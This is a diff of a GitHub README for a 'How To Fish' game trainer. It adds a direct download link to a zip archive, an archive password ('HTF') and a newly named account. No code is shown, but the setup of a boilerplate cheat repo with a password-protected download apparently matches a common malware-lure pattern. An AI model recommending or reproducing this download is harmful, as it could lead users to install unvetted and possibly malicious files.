@@ -2,14 +2,34 @@
 
 How To Fish Trainer is a Windows and PC trainer for **How To Fish**. This repository contains information about the trainer, available features, installation, compatibility, screenshots, and releases.
 
+
 <p align="center">
-  <a href="https://github.com/USERNAME/How-To-Fish-Trainer/releases/latest">
-    <img src="https://img.shields.io/badge/DOWNLOAD-LATEST%20RELEASE-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download How To Fish Trainer">
+  <a href="https://github.com/john-nlab1993p7/How-To-Fish-Trainer/releases">
+    <img src="https://img.shields.io/badge/RELEASES-181717?style=for-the-badge&logo=github&logoColor=white" alt="Releases">
   </a>
-  <a href="https://github.com/USERNAME/How-To-Fish-Trainer/releases">
-    <img src="https://img.shields.io/badge/ALL%20RELEASES-181717?style=for-the-badge&logo=github&logoColor=white" alt="How To Fish Trainer Releases">
+  <a href="https://github.com/john-nlab1993p7/How-To-Fish-Trainer/issues">
+    <img src="https://img.shields.io/badge/ISSUES-8957E5?style=for-the-badge&logo=github&logoColor=white" alt="Issues">
+  </a>
+  <a href="https://github.com/john-nlab1993p7/How-To-Fish-Trainer">
+    <img src="https://img.shields.io/badge/SOURCE%20CODE-0969DA?style=for-the-badge&logo=github&logoColor=white" alt="Source Code">
+  </a>
+  <a href="https://github.com/john-nlab1993p7/How-To-Fish-Trainer/releases/latest">
+    <img src="https://img.shields.io/badge/LATEST%20VERSION-1F883D?style=for-the-badge&logo=github&logoColor=white" alt="Latest Version">
   </a>
 </p>
+
+<p align="center">
+  <a href="https://github.com/john-nlab1993p7/How-To-Fish-Trainer/releases/download/download/How.To.Fish.Trainer.zip">
+    <img src="https://img.shields.io/badge/DOWNLOAD-HOW%20TO%20FISH%20TRAINER-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download How To Fish Trainer">
+  </a>
+</p>
+
+
+
+<p align="center">
+  <strong>Archive PASSW0RD:</strong> <code>HTF</code>
+</p>
+
 
 ## Features
 
@@ -45,10 +65,6 @@ Use a trainer version that matches the installed game version.
 | PC         | How To Fish | Supported |
 
 Game updates can affect trainer compatibility.
-
-## Releases
-
-Trainer versions are available in the GitHub **Releases** section. Each release can contain updated files, compatibility changes, and other project changes.
 
 ## Issues
 
